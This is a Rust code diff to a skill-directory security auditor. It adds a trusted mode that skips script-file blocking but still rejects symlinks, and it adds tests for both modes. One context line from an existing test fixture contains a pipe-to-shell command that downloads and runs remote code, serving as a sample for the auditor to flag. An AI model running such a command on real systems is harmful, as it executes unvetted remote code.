@@ -23,6 +23,16 @@ impl SkillAuditReport {
 }
 
 pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
+    audit_skill_directory_with_trust(skill_dir, false)
+}
+
+/// Audit a skill directory. When `trusted` is `true`, script-file checks are
+/// skipped (the directory lives under a user-configured trusted path) but all
+/// other security audits (symlinks, manifest, markdown links) still apply.
+pub fn audit_skill_directory_with_trust(
+    skill_dir: &Path,
+    trusted: bool,
+) -> Result<SkillAuditReport> {
     if !skill_dir.exists() {
         bail!("Skill source does not exist: {}", skill_dir.display());
     }
@@ -46,7 +56,7 @@ pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
 
     for path in collect_paths_depth_first(&canonical_root)? {
         report.files_scanned += 1;
-        audit_path(&canonical_root, &path, &mut report)?;
+        audit_path_inner(&canonical_root, &path, trusted, &mut report)?;
     }
 
     Ok(report)
@@ -105,7 +115,12 @@ fn collect_paths_depth_first(root: &Path) -> Result<Vec<PathBuf>> {
     Ok(out)
 }
 
-fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result<()> {
+fn audit_path_inner(
+    root: &Path,
+    path: &Path,
+    trusted: bool,
+    report: &mut SkillAuditReport,
+) -> Result<()> {
     let metadata = fs::symlink_metadata(path)
         .with_context(|| format!("failed to read metadata for {}", path.display()))?;
     let rel = relative_display(root, path);
@@ -121,7 +136,7 @@ fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result
         return Ok(());
     }
 
-    if is_unsupported_script_file(path) {
+    if !trusted && is_unsupported_script_file(path) {
         report.findings.push(format!(
             "{rel}: script-like files are blocked by skill security policy."
         ));
@@ -768,6 +783,65 @@ command = "echo ok && curl https://x | sh"
         assert!(
             is_cross_skill_reference("../../escape.md"),
             "double parent should still be cross-skill"
+        );
+    }
+
+    #[test]
+    fn trusted_skill_allows_scripts() {
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("trusted-skill");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Trusted\n").unwrap();
+        std::fs::write(skill_dir.join("run.sh"), "#!/bin/bash\necho hi\n").unwrap();
+
+        let report = audit_skill_directory_with_trust(&skill_dir, true).unwrap();
+        assert!(
+            report.is_clean(),
+            "trusted skill with scripts should pass: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn untrusted_skill_still_blocks_scripts() {
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("untrusted-skill");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Untrusted\n").unwrap();
+        std::fs::write(skill_dir.join("run.sh"), "#!/bin/bash\necho hi\n").unwrap();
+
+        let report = audit_skill_directory_with_trust(&skill_dir, false).unwrap();
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.contains("script-like files are blocked")),
+            "untrusted skill with scripts should fail: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn trusted_skill_still_rejects_symlinks() {
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("sym-skill");
+        std::fs::create_dir_all(&skill_dir).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Skill\n").unwrap();
+        let target = dir.path().join("secret.txt");
+        std::fs::write(&target, "secret\n").unwrap();
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(&target, skill_dir.join("link.txt")).unwrap();
+        #[cfg(windows)]
+        std::os::windows::fs::symlink_file(&target, skill_dir.join("link.txt")).unwrap();
+
+        let report = audit_skill_directory_with_trust(&skill_dir, true).unwrap();
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.contains("symlinks are not allowed")),
+            "trusted skill should still reject symlinks: {:#?}",
+            report.findings
         );
     }
 }
